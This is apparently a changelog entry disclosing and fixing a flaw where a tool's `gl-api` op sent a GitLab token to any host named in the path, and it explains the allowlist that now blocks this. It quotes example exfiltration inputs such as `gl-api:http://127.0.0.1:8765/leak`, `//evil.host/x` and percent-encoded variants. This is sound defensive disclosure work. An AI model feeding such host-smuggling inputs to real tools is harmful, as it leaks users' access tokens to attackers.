- **`gl-api` sent your GitLab token to any host the path named** ([#1035](https://github.com/Digital-Process-Tools/claude-supertool/issues/1035)). `path_refusal()` refused four shapes — empty, flag-shaped, whitespace, `graphql` — and the value then went to `glab api --method GET` verbatim. `glab api` accepts an absolute URL as its endpoint and attaches the instance's `Private-Token` header to it, so `gl-api:http://127.0.0.1:8765/leak` handed a live personal access token to a listener the *input* chose, rendered the listener's reply as an ordinary result and printed `PASS` over it. `:full` repeated the request on every page. The input is not hypothetically remote: a path can arrive out of an issue body, an MR description or a CI job name, all of which this repo already treats as text a stranger wrote.

  **A path may not name a host**, and that is now an allowlist of what a GitLab API path may contain rather than a denylist of schemes — a denylist has to enumerate every spelling of `http` and is one new scheme, one casing and one encoder behind forever. Refused: a scheme at the front in any casing and with or without the `//` after it (`http:host` is opaque-but-absolute and glab takes it too); a `//` anywhere in the path portion, which is what a protocol-relative `//evil.host/x` and a userinfo `//gitlab.com@evil.host/x` both need; a backslash, which the parsers that disagree fold into `/`; and any character outside RFC 3986's `pchar` plus `/`, which is what takes out control bytes, `#` and `<`. All three structural checks run a second time against the percent-decoded value, so `http%3A%2F%2Fevil.host` and `%2F%2Fevil.host` do not smuggle past the first pass. Because nothing can name a host, every request still resolves against the instance glab is configured for, without supertool having to read glab's config to find out which one that is.

  **Refused, never sanitised** — the same argument the op's docstring already made about `-X POST`. Stripping the scheme would send *a* request, and its answer would read as the one the caller asked for. The refusal names the value and which of the four structural facts it tripped, in the shape the existing refusals use.

  The breakage budget is pinned too, because a rule this shape is only worth having if real paths survive it: `projects/:id/members/all` and every other glab `:placeholder`, a leading `/`, percent-encoded group paths (`projects/group%2Fsub%2Fproj/issues`), query strings including GitLab's own bracket filters (`?not[labels]=bug`), ISO timestamps with their colons, npm scoped packages (`packages/npm/@scope/name`) and percent-encoded `@` in a search value all still go through unchanged.

  **What this does not cover, stated rather than implied.** A GitLab-hosted path that answers with a redirect, or a `Link` header under `--paginate`, is followed by glab and not by supertool — Go's client strips `Authorization` across hosts but not a custom `Private-Token` — so the guarantee is about the host supertool asks for, not about every host glab may end up talking to.

  Swept the siblings for the same shape: `gl-api` was the only op putting a caller-supplied string in an endpoint position with no fixed prefix in front of it. `gl-mr`, `gl-job`, `gl-pipeline`, `gl-runners`, `gl-issue`, `gl-mrs`, `gh-star`, `gh-follow`, `gh-check`, `gh-job`, `gh-branch` and `_declared_legs` all interpolate into a path that begins with a literal segment (`projects/:id/…`, `repos/{owner}/{repo}/…`, `user/starred/…`), where a scheme cannot reach column zero.
